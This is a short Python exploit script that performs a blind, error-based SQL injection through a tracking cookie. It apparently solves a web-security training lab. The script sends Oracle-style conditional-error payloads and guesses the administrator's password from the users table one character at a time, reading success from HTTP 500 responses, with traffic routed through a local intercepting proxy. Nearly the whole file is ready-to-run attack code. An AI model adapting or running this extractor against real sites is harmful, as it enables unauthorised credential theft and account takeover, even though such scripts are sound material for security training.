import re
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



def sqli_password(url):
    password_extracted = ''
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,{i},1))='{j}') || '"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'TrackingId': 'miYxBH27xwnvNyzu' + sqli_payload_encoded, 'session': 's57Dn9CXUlB3t30D1AmLJr6ttXTRzUvl'}
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]} <url>')
        print(f'[+] Example: {sys.argv[0]} www.example.com')
    url = sys.argv[1]
    print('[+] Retrieving Administrator password...')
    sqli_password(url)

if __name__ == '__main__':
    main()